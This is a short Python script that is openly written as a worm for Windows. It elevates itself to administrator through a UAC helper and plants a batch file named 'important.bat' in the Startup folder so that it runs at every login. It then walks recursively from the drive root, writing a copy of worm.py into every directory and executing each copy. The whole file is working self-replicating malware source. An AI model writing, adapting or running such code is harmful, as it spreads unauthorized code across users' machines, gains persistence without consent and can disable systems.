from os import chdir, scandir, getcwd, environ, path as ospath
from subprocess import run
import UAC

# IF UAC is not given, main-traverse.py will not be executed
if not UAC.isUserAdmin():
    UAC.runAsAdmin()

# To be executed upon login to OS
USER_NAME = environ["USERNAME"]
target_path = ospath.realpath(__file__)
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

with open(bat_path + '\\' + "important.bat", "w") as bat_file:
    bat_file.write(f'start "" {target_path}')

# read worm.py binary info
WORM_BIN = b""
with open("worm.py", "rb") as infile:
    info = infile.read()
    WORM_BIN += info

# start traversal at drive
chdir('/')
def traverse(path):
    # plant worm1.py in the absolute path currently on
    try:
        worm_path = ospath.realpath(path)+"\worm1.py"
        with open(worm_path, "wb") as outfile:
            outfile.write(WORM_BIN)
        run((worm_path), shell=True)   
        
    except PermissionError:
        pass
        
    with scandir(path) as scanner:
        if scanner:
            directories = [entry for entry in scanner if entry.is_dir()]

            if directories:
                for entry in directories:
                    try:      
                        traverse(entry.path)
                
                    except PermissionError:
                        continue
    return

if __name__ == "__main__":
    traverse(getcwd())
